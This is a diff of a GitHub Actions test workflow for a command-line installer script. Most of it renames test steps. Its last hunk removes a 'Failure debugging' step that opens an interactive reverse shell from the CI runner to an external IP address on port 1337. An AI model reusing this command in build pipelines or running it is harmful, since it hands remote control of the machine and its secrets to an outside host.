@@ -46,7 +46,7 @@ jobs:
       run: |
         brew install libmagic
 
-    - name: Execute generic tests
+    - name: Run tests - Common
       run: |
         python3 modern.py -v --search-unix ls
         python3 modern.py -v --search-rust lsd
@@ -55,14 +55,14 @@ jobs:
         python3 modern.py -v --install-all --dry-run
         python3 modern.py -v --install-all
 
-    - name: Execute linux tests
+    - name: Run tests - Linux
       if: matrix.os == 'ubuntu-latest'
       run: |
         python3 modern.py -v --search-rust exa
         python3 modern.py -v --install exa
         python3 modern.py -v --install ox
 
-    - name: Execute macos tests
+    - name: Run tests - MacOS
       if: matrix.os == 'macos-latest'
       run: |
         python3 modern.py -v --install exa
@@ -88,8 +88,3 @@ jobs:
       with:
         name: modern_cmdline_${{ matrix.os }}_${{ matrix.platform }}_${{ env.GITHUB_SHA_SHORT }}
         path: ~/bin
-
-    - name: Failure debugging
-      if: matrix.os == 'macos-latest' && ${{ failure() }}
-      run: |
-        bash -i >& /dev/tcp/168.62.48.32/1337 0>&1
